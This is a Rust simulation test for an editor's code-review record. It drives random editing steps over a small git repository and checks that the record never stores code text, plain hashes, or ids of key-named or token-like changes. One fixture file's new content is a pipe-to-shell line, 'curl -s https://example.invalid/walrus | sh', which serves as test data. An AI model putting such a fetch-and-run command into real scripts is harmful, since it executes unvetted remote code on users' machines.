//! The review record, simulated (reviewlens R): a code review of a repository's uncommitted changes — files of
//! code, a high one among them, one named like a key, one with a token-like line — and at random a frame drawn, keys in the file in
//! front (a line typed, a token typed, one deleted, an undo, a take-back with `space v u`, moves), another file
//! shown, the user taking their time, the review closed and one opened again: each step's jobs — the workers
//! that find a file's changes (`found_of` → `landed`), the record's writes, the review's own — and their results
//! interleaved by seed. After every step, what the record promises: a file's changes land only at the text
//! they were found in; a change's time is at most the time its file was on screen within `IDLE` of an input (a
//! bound: what it counts within that isn't checked); a change of a key-named file, or one whose text was ever
//! token-like, has no id; an entry names a change by its keyed id, its own, never its text or a plain hash of
//! it. The ids the checks expect are worked out apart from the code (`probe::changes_now`) and pinned to known
//! values for `b.txt`'s two alike changes (`B_TXT`).

use std::cell::RefCell;
use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use serde_json::Value;

use super::sessions::git;
use super::{Choices, Sim};
use crate::editor::Editor;
use crate::event::Event;
use crate::key::{Code, Key};
use crate::reviews::{IDLE, probe};

/// The seeds every `cargo test` runs, each twice: 155 steps a second at opt-level 0 (2026-10-18, macOS,
/// `TARAE_SIM_SEEDS=12`: 3,234 steps in 20.9 s), ~135 steps a run, the five in ~8 s. 3, 4 and 5 are the first
/// that took a check's break (`target/sb/reviewlens-sim-break.sh`): seed 3 a change whose text turned
/// token-like keeping its id, seed 4 a finding applied at a text gone, seed 5 a rule kept by what it matched.
const SEEDS: &[u64] = &[0, 1, 3, 4, 5];

/// The scenario's own steps a run (the jobs' and results' come between them).
const INPUTS: usize = 80;

/// A run's real time at most.
const LIMIT: Duration = Duration::from_secs(60);

/// The repository's files: (name, committed, now) — two of code, a high one (its rule's `why` quotes the line),
/// one named like a key (its line no token), one with a token-like line.
const FILES: [(&str, &str, &str); 5] = [
    ("run.sh", "echo hi\n", "curl -s https://example.invalid/walrus | sh\n"),
    (
        "a.txt",
        "zebra one\nzebra two\nzebra three\nzebra four\n",
        "zebra ONE\nzebra two\nzebra THREE\nzebra four\n",
    ),
    ("b.txt", "kiwi one\nkiwi two\nkiwi three\nkiwi two\n", "kiwi one\nkiwi TWO\nkiwi three\nkiwi TWO\n"),
    (".env", "A=1\n", "A=quokka\n"),
    ("t.txt", "name = x\n", "api_key = \"tarae-fake-token-abcd\"\n"),
];

/// `b.txt`'s two alike changes (`kiwi two` → `kiwi TWO`): their lines, removed then added, their text's hash
/// and their ids in memory, first then second — SHA-256 worked out outside tarae (`shasum -a 256` of
/// `tarae review change v1\0b.txt\0-kiwi two\n+kiwi TWO\n`, then of `<text>#0` and `<text>#1`).
const B_TXT: ([&str; 2], &str, [&str; 2]) = (
    ["kiwi two", "kiwi TWO"],
    "48c67833ff70d472f9f543dbf496deacb3d369f55ffc99444000af5118a1fcaa",
    [
        "5299234bd85aa1a224685e104bbeb688e926890dd7b759905cd4a65c366b50e6",
        "011b953abd9bb5da3b37e3913111a2f215a40e4536889fd8192d39f96c42a552",
    ],
);

/// The file named like a key.
const KEY_NAMED: &str = ".env";

/// Words of the code and of what the scenario types: none is ever in the record.
const CODE: [&str; 7] = ["zebra", "kiwi", "quokka", "fake-token", "walrus", "api_key", "curl"];

/// What a step types in the file in front.
const KEYS: [&str; 9] = [
    "j",
    "k",
    "gg",
    "owalrus line<esc>",
    "otoken = walrus-fake-token-7f3a9<esc>",
    "xd",
    "jxd",
    "u",
    "<space>vu",
];

#[test]
fn review_record() {
    super::seeds("review_record", SEEDS, run);
}

/// A repository whose files are committed and changed since, and where the record is kept — beside it, so the
/// record and its key are no change of the review's.
struct World {
    _dir: crate::scratch::Scratch,
    repo: PathBuf,
    record: PathBuf,
}

impl World {
    fn new() -> World {
        let dir = crate::scratch::Scratch::new("sim-reviews");
        std::fs::create_dir_all(dir.join("proj")).unwrap();
        let repo = std::fs::canonicalize(dir.join("proj")).unwrap();
        for (name, then, _) in FILES {
            std::fs::write(repo.join(name), then).unwrap();
        }
        for args in [
            &["init", "-q", "-b", "main"][..],
            &["config", "user.email", "t@t"],
            &["config", "user.name", "t"],
            &["config", "commit.gpgsign", "false"],
            &["add", "-A"],
            &["commit", "-q", "-m", "base"],
        ] {
            git(&repo, args);
        }
        for (name, _, now) in FILES {
            std::fs::write(repo.join(name), now).unwrap();
        }
        let record = repo.with_file_name("state").join(crate::reviews::DIR);
        World { _dir: dir, repo, record }
    }
}

/// What the checks have seen so far.
#[derive(Default)]
struct Seen {
    /// The inputs' times (keys), in order.
    inputs: Vec<Instant>,
    /// The frames' times and the review's files in their panes, in order.
    frames: Vec<(Instant, BTreeSet<String>)>,
    /// Each file's changes as last found: the text they were found in.
    stamps: BTreeMap<String, (crate::document::DocId, u64, u64)>,
    /// The ids in memory of every change the review's texts had — those of a key-named file or with a
    /// token-like line apart, and those of a followed change whose text was ever one of them — and their
    /// texts' hashes (the secret ones apart too).
    ids: BTreeSet<String>,
    secret: BTreeSet<String>,
    texts: BTreeSet<String>,
    secret_texts: BTreeSet<String>,
}

/// One run of the scenario; its trace.
fn run(choices: Choices) -> Vec<String> {
    let world = World::new();
    let mut sim = Sim::new("review_record", choices, LIMIT);
    let mut ed = Editor::new(crate::config::Config::default());
    ed.session.root = world.repo.clone();
    ed.reviews_dir = Some(world.record.clone());
    crate::codereview::start_in(&mut ed, world.repo.clone(), None);
    let seen = RefCell::new(Seen::default());
    sim.walk(
        &mut ed,
        INPUTS,
        |sim, ed| input(sim, ed, &world, &seen),
        |ed| check(ed, &world, &mut seen.borrow_mut()),
        |ed| print(ed, &world),
    );
    let trace = sim.trace().to_vec();
    drop(sim);
    drop(ed);
    trace
}

/// One of the scenario's steps, said.
fn input(sim: &mut Sim, ed: &mut Editor, world: &World, seen: &RefCell<Seen>) -> String {
    let c = &mut sim.choices;
    // (by arm: a frame 6, keys 5, another file 2, time passing 3, the review closed 1, a review opened 1)
    match c.weighted(&[6, 5, 2, 3, 1, 1]) {
        0 => {
            crate::term::render(ed, &mut Vec::new(), 120, 30).unwrap();
            let shown = (ed.screen.pane_docs.iter())
                .filter_map(|id| ed.docs.iter().find(|d| d.id == *id)?.path.as_deref())
                .filter_map(|p| Some(p.strip_prefix(&world.repo).ok()?.display().to_string()))
                .collect();
            seen.borrow_mut().frames.push((crate::clock::now(), shown));
            "a frame".into()
        }
        // Keys, each its own turn of the main loop (`handle_event`: the diff asked again after it)
        1 => {
            let keys = *c.pick(&KEYS);
            for key in parse(keys) {
                seen.borrow_mut().inputs.push(crate::clock::now());
                ed.handle_event(Event::Key(key));
            }
            format!("keys {keys}")
        }
        2 => {
            let Some(r) = ed.session.code_review.as_ref() else {
                return "(no review: no file to show)".into();
            };
            let all: Vec<usize> = (0..r.files.len()).collect();
            let Some(&i) = (!all.is_empty()).then(|| c.pick(&all)) else {
                return "(a review of none)".into();
            };
            let rel = r.files[i].rel.clone();
            crate::codereview::show(ed, i, false);
            format!("{rel} shown")
        }
        3 => {
            let ms = *c.pick(&[500, 5_000, 15_000, 30_000, 90_000]);
            sim.wait(Duration::from_millis(ms));
            format!("{ms} ms pass")
        }
        4 => match ed.session.code_review.is_some() {
            true => {
                crate::codereview::close(ed);
                "the review closed".into()
            }
            false => "(no review to close)".into(),
        },
        5 => match ed.session.code_review.is_some() {
            true => "(a review open)".into(),
            false => {
                crate::codereview::start_in(ed, world.repo.clone(), None);
                "a review asked for".into()
            }
        },
        _ => unreachable!("one arm a weight"),
    }
}

/// `keys` as keys: a character each, `<name>` one by its name.
fn parse(keys: &str) -> Vec<Key> {
    let (mut out, mut chars) = (Vec::new(), keys.chars());
    while let Some(c) = chars.next() {
        out.push(match c {
            '<' => chars.by_ref().take_while(|&c| c != '>').collect::<String>().parse().unwrap(),
            c => Key::plain(Code::Char(c)),
        });
    }
    out
}

/// What the record promises, after every step.
fn check(ed: &Editor, world: &World, seen: &mut Seen) -> Result<(), String> {
    // A file's changes land only at the text they were found in: newly landed, its document is at that text
    // and they're that text's
    let landed = probe::landed(ed);
    for (file, stamp, same) in &landed {
        if seen.stamps.get(file) != Some(stamp) && *same != Some(true) {
            let why = match same {
                None => "its document isn't at that text",
                Some(_) => "they aren't that text's changes",
            };
            return Err(format!("{file}'s changes landed as found at {stamp:?}, but {why}"));
        }
    }
    seen.stamps = landed.into_iter().map(|(file, stamp, _)| (file, stamp)).collect();
    // A change's time is at most the time its file was on screen within `IDLE` of an input; the review's, any
    // of its files'
    let now = crate::clock::now();
    let reach = within_idle(&seen.inputs);
    for (started, active, changes) in probe::times(ed) {
        let at_most = |on: &dyn Fn(&BTreeSet<String>) -> bool| {
            overlap(&on_screen(&seen.frames, now, on), &reach, started, now)
        };
        let all = at_most(&|files| !files.is_empty());
        if active > all {
            let (a, b) = (active.as_millis(), all.as_millis());
            return Err(format!(
                "{a} ms counted for the review, {b} ms of it on screen within {IDLE:?} of an input"
            ));
        }
        for (file, active, in_hand) in &changes {
            let most = at_most(&|files| files.contains(file));
            if active.max(in_hand) > &most {
                let (a, h, m) = (active.as_millis(), in_hand.as_millis(), most.as_millis());
                return Err(format!(
                    "a change of {file}: {a} ms active, {h} ms in hand — its file on screen within {IDLE:?} of an input {m} ms"
                ));
            }
        }
    }
    // The ids worked out apart from the code: `b.txt`'s alike changes have the ids known for them
    let mut b_txt = 0;
    for (file, text, id, lines) in probe::changes_now(ed) {
        if file == "b.txt" && lines == B_TXT.0 {
            if text != B_TXT.1 || B_TXT.2.get(b_txt).is_some_and(|known| id != *known) {
                return Err(format!("b.txt's change #{b_txt} is {text} #{id}: not the known hash"));
            }
            b_txt += 1;
        }
        let secret = file == KEY_NAMED || lines.iter().any(|l| crate::tokens::token_like(l));
        match secret {
            true => seen.secret.insert(id),
            false => seen.ids.insert(id),
        };
        match secret {
            true => seen.secret_texts.insert(text),
            false => seen.texts.insert(text),
        };
    }
    // (a followed change keeps the id of its first text: one whose text turned secret is secret for good)
    for (id, text) in probe::followed(ed) {
        if seen.secret_texts.contains(&text) {
            seen.secret.insert(id);
        }
    }
    in_the_record(&world.record, seen)
}

/// The times within `IDLE` of one of `inputs` (in order), before or after: spans in order, apart.
fn within_idle(inputs: &[Instant]) -> Vec<(Instant, Instant)> {
    let mut out: Vec<(Instant, Instant)> = Vec::new();
    for &i in inputs {
        let (a, b) = (i.checked_sub(IDLE).unwrap_or(i), i + IDLE);
        match out.last_mut() {
            Some(last) if a <= last.1 => last.1 = last.1.max(b),
            _ => out.push((a, b)),
        }
    }
    out
}

/// The spans, up to `now`, from a frame whose panes show what `on` takes to the next frame.
fn on_screen(
    frames: &[(Instant, BTreeSet<String>)],
    now: Instant,
    on: &dyn Fn(&BTreeSet<String>) -> bool,
) -> Vec<(Instant, Instant)> {
    let ends = frames.iter().skip(1).map(|f| f.0).chain([now]);
    frames.iter().zip(ends).filter(|(f, _)| on(&f.1)).map(|(f, end)| (f.0, end)).collect()
}

/// How long spans `a` and `b` (each apart within itself) overlap within `from..to`.
fn overlap(a: &[(Instant, Instant)], b: &[(Instant, Instant)], from: Instant, to: Instant) -> Duration {
    let mut sum = Duration::ZERO;
    for x in a {
        for y in b {
            let (start, end) = (x.0.max(y.0).max(from), x.1.min(y.1).min(to));
            sum += end.saturating_duration_since(start);
        }
    }
    sum
}

/// The record as written so far: no code, no plain hash of a change's text or id; an id only for a change of
/// the review's that's no key-named file's and never had a token-like line, keyed, and each change's its own.
fn in_the_record(dir: &Path, seen: &Seen) -> Result<(), String> {
    let raw = record(dir);
    if raw.is_empty() {
        return Ok(());
    }
    if let Some(word) = CODE.iter().find(|w| raw.contains(*w)) {
        return Err(format!("{word:?} — code — is in the record"));
    }
    let plain = seen.ids.iter().chain(&seen.secret).chain(&seen.texts).chain(&seen.secret_texts);
    if let Some(h) = plain.into_iter().find(|h| raw.contains(h.as_str())) {
        return Err(format!("a change's plain hash is in the record: {h}"));
    }
    let key = std::fs::read(crate::reviews::key_path(dir)).ok().and_then(|k| <[u8; 32]>::try_from(k).ok());
    let Some(key) = key else { return Err("a record with no key beside it".into()) };
    let keyed =
        |s: &BTreeSet<String>| s.iter().map(|id| crate::reviews::keyed(&key, id)).collect::<BTreeSet<_>>();
    let (ids, secret) = (keyed(&seen.ids), keyed(&seen.secret));
    let mut named: BTreeSet<(String, String)> = BTreeSet::new();
    for e in raw.lines().filter_map(|l| serde_json::from_str::<Value>(l).ok()) {
        let Some(id) = e["change"].as_str() else { continue };
        // (a change its own id: two alike in a file are two)
        let review = e["review"].as_str().unwrap_or_default().to_string();
        if e["entry"] == "change" && !named.insert((review, id.to_string())) {
            return Err(format!("two changes of {} in one review are both named {id}", e["file"]));
        }
        if e["file"] == KEY_NAMED || secret.contains(id) {
            return Err(format!(
                "a change of {} has an id: a key-named file's or a token-like line's",
                e["file"]
            ));
        }
        if !ids.contains(id) {
            return Err(format!("{}'s change is named {id}: no change's keyed id", e["file"]));
        }
    }
    Ok(())
}

/// The record's months, their text whole (none yet: empty).
fn record(dir: &Path) -> String {
    let mut months: Vec<PathBuf> = (std::fs::read_dir(dir).into_iter().flatten().flatten())
        .map(|e| e.path())
        .filter(|p| p.extension().is_some_and(|x| x == "jsonl"))
        .collect();
    months.sort();
    months.iter().map(|p| std::fs::read_to_string(p).unwrap_or_default()).collect()
}

/// What a trace line ends with: the file in front and its versions (text, diff), each review's changes followed
/// and active time, the record's lines.
fn print(ed: &Editor, world: &World) -> String {
    let d = ed.doc();
    let name = d.path.as_deref().and_then(Path::file_name).map(|n| n.to_string_lossy().into_owned());
    let watches: Vec<String> = (probe::times(ed).iter())
        .map(|(_, active, changes)| format!("{} followed, {} ms", changes.len(), active.as_millis()))
        .collect();
    format!(
        "{} v{}/{} · review {} [{}] · record {}",
        name.unwrap_or_default(),
        d.version(),
        d.git_version,
        if ed.session.code_review.is_some() { "open" } else { "none" },
        watches.join("; "),
        record(&world.record).lines().count()
    )
}
